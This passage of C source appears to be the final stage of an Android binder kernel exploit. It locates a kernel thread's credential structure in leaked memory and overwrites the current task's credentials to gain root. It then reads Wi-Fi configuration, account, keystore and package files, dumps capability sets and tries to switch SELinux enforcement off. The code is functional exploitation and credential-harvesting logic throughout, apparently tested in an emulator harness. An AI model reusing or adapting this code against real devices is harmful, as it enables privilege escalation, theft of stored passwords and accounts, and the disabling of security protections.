                 * in .rodata and would yield a garbage credential. Verify the
                 * pointed-to object by reading it out of the same window. */
                long co2 = (long)(cr + 120 - base);
                if (co2 < 0 || (size_t)co2 + 8 > n) continue;
                const u8 *c = seg + (long)(cr - base) + 0;
                long cb = (long)(cr - base);
                if (cb < 0 || (size_t)cb + 128 > n) continue;
                (void)c;
                u32 usage; memcpy(&usage, seg + cb, 4);
                if (usage == 0 || usage > 0x4000) continue;
                u32 ident[4];
                memcpy(ident, seg + cb + 4, 16);
                if (ident[0] | ident[1] | ident[2] | ident[3]) continue;
                u64 caps; memcpy(&caps, seg + cb + 56, 8);
                if (caps != 0x0000001fffffffffULL) continue;
                u64 sec; memcpy(&sec, seg + cb + 112, 8);
                if (sec < 0xffffffc000000000ULL) continue;
                adopt = cr;
                fprintf(LOG, "donor '%s' at leak+0x%zx cred=0x%016llx (verified)\n",
                        donors[d], o, (unsigned long long)cr);
                break;
            }
        }
        if (adopt){
            u8 pair[16];
            memcpy(pair, &adopt, 8); memcpy(pair + 8, &adopt, 8);
            int aok = 0;
            for (int t = 1; t <= 400 && !aok; t++){
                aok = do_write(h, tsk + TASK_REALCRED, pair, 16);
                if (!aok){
                    memset(rbuf,0,64); bwr(0,512);
                    close_binder(); bfd = open_binder();
                    if (bfd < 0) break;
                    if (get_service("activity",&h) <= 0){
                        if (!getenv("BINDER_QEMU")) break;
                        h = 0;
                        close_binder(); bfd = open_binder();
                        if (bfd < 0) break;
                    }
                }
            }
            fprintf(LOG,"cred adoption landed=%d uid=%d euid=%d\n", aok, getuid(), geteuid());
        } else {
            fprintf(LOG,"no donor kthread task_struct in the window\n");
        }
    }

    if (getuid() == 0){
        const char *paths[] = {
            "/data/misc/wifi/wpa_supplicant.conf",
            "/data/system/packages.xml",
            "/data/local/tmp/proof",
            "/data/misc/keystore/user_0",
        };
        for (int i = 0; i < 4; i++){
            int f = open(paths[i], O_RDONLY);
            fprintf(LOG,"open(%s)=%d errno=%d\n", paths[i], f, f<0?errno:0);
            if (f >= 0) close(f);
        }
        int f = open("/data/local/tmp/rootproof", O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (f >= 0){ write(f, "root\n", 5); close(f); }
        /* Prove privileges, not just the uid: /proc/self/status reports the
         * kernel's own view of the effective capability set. */
        { FILE *st = fopen("/proc/self/status","r");
          if (st){
              char line[256];
              while (fgets(line, sizeof line, st)){
                  if (!strncmp(line, "CapEff", 6) || !strncmp(line, "CapPrm", 6)
                      || !strncmp(line, "CapBnd", 6))
                      fprintf(LOG,"  %s", line);
              }
              fclose(st);
          }
        }
        { /* the decisive functional test: a root-owned 0600 file needs
           * CAP_DAC_OVERRIDE, which a bare uid 0 change would not give */
          int f = open("/secret.txt", O_RDONLY);
          fprintf(LOG,"open(/secret.txt 0600 root)=%d errno=%d\n", f, f<0?errno:0);
          if (f >= 0){
              char b[32]; ssize_t r = read(f, b, sizeof b - 1);
              if (r > 0){ b[r] = 0; fprintf(LOG,"  read: %s", b); }
              close(f);
          }
        }
        /* Evidence collection: record everything a single run can tell us,
         * because a panic later would lose anything not yet on disk. */
        { const char *probe[] = {
              "/sys/fs/selinux/enforce", "/proc/self/attr/current",
              "/data/misc/wifi/wpa_supplicant.conf",
              "/data/misc/wifi/WifiConfigStore.xml",
              "/data/system/packages.xml",
              "/data/system/accounts.db",
              "/data/misc/keystore", "/data/local/tmp",
              "/dev/block/by-name", "/proc/kallsyms", NULL };
          for (int i = 0; probe[i]; i++){
              int f = open(probe[i], O_RDONLY);
              fprintf(LOG,"probe %-52s = %d (errno %d)\n", probe[i], f, f<0?errno:0);
              if (f >= 0){
                  char b[96]; memset(b,0,sizeof b);
                  ssize_t r = read(f, b, sizeof b - 1);
                  if (r > 0){
                      for (ssize_t k=0;k<r;k++) if (b[k]=='\n'||b[k]=='\r') b[k]=' ';
                      fprintf(LOG,"   -> %s\n", b);
                  }
                  close(f);
              }
          }
          /* setenforce needs SECURITY__SETENFORCE; almost certainly denied in
           * the shell domain, but the errno is worth having. */
          int f = open("/sys/fs/selinux/enforce", O_WRONLY);
          fprintf(LOG,"open(enforce,W)=%d errno=%d\n", f, f<0?errno:0);
          if (f >= 0){
              ssize_t w2 = write(f, "0", 1);
              fprintf(LOG,"  write enforce=0 -> %zd errno=%d\n", w2, w2<0?errno:0);
              close(f);
          }
        }
        fprintf(LOG,"RESULT: ROOT CONFIRMED uid=%d euid=%d\n", getuid(), geteuid());
    } else {
        fprintf(LOG,"RESULT: still uid %d\n", getuid());
    }
    return 0;
}
